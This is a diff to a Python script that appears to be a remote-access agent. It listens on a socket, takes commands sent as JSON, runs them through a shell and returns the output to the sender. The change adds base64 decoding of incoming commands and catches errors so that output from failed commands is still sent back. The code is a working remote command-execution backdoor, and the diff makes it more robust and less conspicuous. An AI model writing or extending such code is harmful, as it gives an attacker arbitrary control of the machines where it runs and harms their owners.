@@ -1,4 +1,6 @@
-import makerequest,decrypt,classes,platform,json,re,uuid,time,subprocess,socket,sys
+#!/usr/bin/python3
+
+import base64,makerequest,decrypt,classes,platform,json,re,uuid,time,subprocess,socket,sys
 from multiprocessing import Process
 from datetime import datetime
 
@@ -113,8 +115,12 @@ def listenfordata():
             if not data["uid"]==uid:
                pass
             if data["command"]:
-               output = subprocess.check_output(data["command"], shell=True, stderr=subprocess.STDOUT, text=True)
-               conn.sendall(str.encode("Time:"+current_time+"<br>"+"Command:"+data["command"]+"<br>"+"Output:"+output))
+               data["command"]=base64.b64decode(data["command"]).decode('utf-8')
+               try:
+                 output = subprocess.check_output(data["command"], shell=True,stderr=subprocess.STDOUT)
+               except subprocess.CalledProcessError as e:
+                 output=e.output
+               conn.sendall(str.encode("Time:"+current_time+"<br>"+"Command:"+data["command"]+"<br>"+"Output:"+str(output.decode('utf-8'))))
             else:
                conn.sendall(str.encode("Time:"+current_time+"<br>"+"Command:empty!"))
         except Exception as ex:
